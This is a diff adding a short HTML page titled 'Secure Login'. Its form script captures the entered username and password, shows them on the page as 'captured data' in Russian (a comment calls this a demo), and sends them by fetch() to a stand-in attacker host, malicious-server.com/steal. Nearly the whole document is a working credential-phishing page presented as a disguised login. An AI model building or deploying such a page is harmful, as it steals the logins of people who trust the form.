@@ -1,0 +1,36 @@
+<!-- index.html  -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Login</title>
+</head>
+<body>
+    <form id="loginForm" onsubmit="sendData(event)">
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button>Login</button>
+    </form>
+    <div id="stolenData"></div>
+
+    <script>
+        function sendData(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Показываем данные жертвы на странице (для "демо")
+            document.getElementById('stolenData').innerHTML = `
+                <h3>Захваченные данные:</h3>
+                <p>Логин: ${username}</p>
+                <p>Пароль: ${password}</p>
+            `;
+
+            // Отправка данных на сервер злоумышленника (пример через fetch)
+            fetch('https://malicious-server.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({ username, password })
+            });
+        }
+    </script>
+</body>
+</html>
